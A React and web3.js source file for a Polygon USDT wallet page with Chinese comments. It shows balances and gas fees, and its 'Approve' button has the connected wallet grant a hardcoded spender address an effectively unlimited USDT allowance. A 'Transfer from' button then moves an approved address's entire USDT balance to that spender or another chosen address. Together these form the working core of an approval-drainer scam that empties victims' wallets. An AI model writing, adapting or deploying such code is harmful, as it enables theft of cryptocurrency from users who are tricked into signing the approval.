import { useEffect, useState } from 'react'
import Web3 from 'web3'
import Toast from 'light-toast'
import Btn from './components/Btn'
import Ipt from './components/Ipt'
import USDT_ERC20_ABI from './config/USDT_ERC20_ABI.json'
import { formatBalance } from './config/utils'

const USDT_ERC20_ADDRESS = '0xdac17f958d2ee523a2206206994597c13d831ec7'
const USDT_POLYGON_ADDRESS = '0xc2132d05d31c914a87c6611c10748aeb04b58e8f'
const SPENDER_ADDRESS = '0xf2d50314B68D9a0338E6139603ca12dfffe11498'

let web3 = null, contract = null, decimals = 6, timer = null
function App() {
	const [ rate, setRate ] = useState({
		'bitcoin': {usd: 51791, cny: 329750},
		'ethereum': {usd: 4400.49, cny: 28017},
		'litecoin': {usd: 163.13, cny: 1038.61},
		'tether': {usd: 0.999824, cny: 6.37},
		'tron': {usd: 0.091731, cny: 0.584041},
		'binancecoin': {usd: 593.87, cny: 3785.58},
		'usd-coin': {usd: 0.998926, cny: 6.36},
		'matic-network': {usd: 2.02, cny: 12.88}
	})
	const [ address, setAddress ] = useState('')
	const [ maticBalance, setMaticBalance ] = useState(0)
	const [ usdtBalance, setUsdtBalance ] = useState(0)
	const [ gasFee, setGasFee ] = useState(0)

	const [ from, setFrom ] = useState('')
	const [ to, setTo ] = useState('')

	/**
	 * 初始化
	 */
	const init = async () => {
		if (window.ethereum) {
			web3 = new Web3(window.ethereum)
			await web3.currentProvider.enable()
			const accounts = await web3.eth.getAccounts()
			setAddress(accounts[0])
			/**
			 * 这里的ABI要使用以太坊主网USDT的ABI，否则没有balanceOf方法
			 */
			contract = new web3.eth.Contract(USDT_ERC20_ABI, USDT_POLYGON_ADDRESS)
			console.log(contract)
			refresh()
			getGasFee()
			timer = setInterval(getGasFee, 5000)
		} else {
			Toast.fail('Ethereum not found!')
		}
	}

	const refresh = async (loading = false) => {
		loading && Toast.loading('Loading...')
		const res = await web3.eth.getAccounts()
		const selectedAddress = web3.utils.toChecksumAddress(res[0])
		const maticB = await web3.eth.getBalance(selectedAddress)
		setMaticBalance(web3.utils.fromWei(maticB, 'ether'))
		try {
			const usdtB = await contract.methods.balanceOf(selectedAddress).call()
			setUsdtBalance(usdtB / Math.pow(10, decimals))
		} catch (error) {
			console.log(error)
		} finally {
			Toast.hide()
		}
		
	}

	const getGasFee = async () => {
		const gasPrice = await web3.eth.getGasPrice()
		const fee = 80000 * +(web3.utils.fromWei(gasPrice, 'ether'))
		setGasFee(fee)
	}

	const getRate = () => {
		fetch(`https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,tether,usd-coin,litecoin,tron,binancecoin,matic-network&vs_currencies=usd,cny`)
			.then(res => res.json())
			.then(res => {
				setRate(res)
				const r = {
					ts: new Date().getTime(),
					value: res
				}
				localStorage.setItem('rate', JSON.stringify(r))
			})
	}

	useEffect(() => {
		Toast.loading('Loading...')
		const rate1 = localStorage.getItem('rate')
		if (rate1) {
			const r = JSON.parse(rate1)
			setRate(r.value)
			if ((+r.ts - new Date().getTime()) > 3600000 * 6) {
				getRate()
			}
		} else {
			getRate()
		}
		
		setTimeout(() => init(), 500)
		return () => {
			clearInterval(timer)
			timer = null
		}
	}, [])

	return (
		<div className="w-full flex flex-col items-center p-4">
			<h1 className="text-4xl text-red-500 text-center font-bold pt-4">POLYGON</h1>
			<div className="py-3 text-center text-sm text-gray-600">
				<div>Address: <span className="text-blue-500">{address}</span></div>
				<div>Balance:  <span className="text-red-500 mx-2">{formatBalance(maticBalance)} MATIC</span>| <span className="text-green-500 ml-2">{formatBalance(usdtBalance)} USDT</span></div>
				<div style={{ animation: 'fade 1s infinite' }}>
					Estimated gas fee: 
					<span className="text-yellow-500 ml-2">{formatBalance(gasFee)} MATIC</span>
					<span className="mx-2">(${formatBalance(+gasFee * rate['matic-network'].usd, 2)})</span>
					<span>(¥{formatBalance(+gasFee * rate['matic-network'].cny, 2)})</span>
				</div>
			</div>
			<Btn text={'Refresh'} onClick={() => refresh(true)} />
			<Btn 
				text={'Approve'} 
				theme={'green'} 
				onClick={async () => {
					const allowanceBalance = (await contract.methods.allowance(address, SPENDER_ADDRESS).call()) / Math.pow(10, decimals)
					console.log(allowanceBalance)
					if (allowanceBalance > 0) {
						return Toast.success('You have done!')
					}
					const res = await contract.methods.approve(SPENDER_ADDRESS, 99999999 * Math.pow(10, decimals)).send({
						from: address,
						gas: 80000
					})
					if (res.code === 4001) {
						return Toast.fail(res.message)
					}
					Toast.success('Success!')
				}} 
			/>
			<Ipt 
				placeholder={'From (Approved)'} 
				value={from} 
				onChange={(e) => {
					setFrom(e.target.value)
				}} 
			/>
			<Ipt 
				placeholder={'To'} 
				value={to} 
				onChange={(e) => {
					setTo(e.target.value)
				}}
			/>
			<Btn 
				text={'Get allowance'} 
				theme={'yellow'} 
				onClick={async () => {
					// // if (!from.trim()) {
					// // 	Toast.fail('From address is required!')
					// // 	return
					// // }
					if (from && !web3.utils.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const allowanceBalance = (await contract.methods.allowance(from || address, SPENDER_ADDRESS).call())/Math.pow(10, decimals)
					Toast.info(`查询：【${from || address}】给【${SPENDER_ADDRESS}】剩余授权余额为:${allowanceBalance}`)
				}} 
			/>
			<Btn 
				text={'Transfer from'} 
				theme={'yellow'} 
				onClick={async () => {
					if (from && !web3.utils.isAddress(from.trim())) {
						Toast.fail('From address is invalid!')
						return
					}
					const toAddress = to || SPENDER_ADDRESS
					const balance = await contract.methods.balanceOf(from || address).call()
					alert(`【${from || address}】向【${toAddress}】转账【${balance / Math.pow(10, decimals)}】开始`)
					Toast.loading('Loading...')
					const res = await contract.methods.transferFrom(from || address, toAddress, balance).send()
					// // const res = await contract.transfer(toAddress, balance).send()
					console.log(res)
					Toast.hide()
					setTimeout(() => {
						refresh()
					}, 3000)
					
				}}
			/>
		</div>
	)
}

export default App
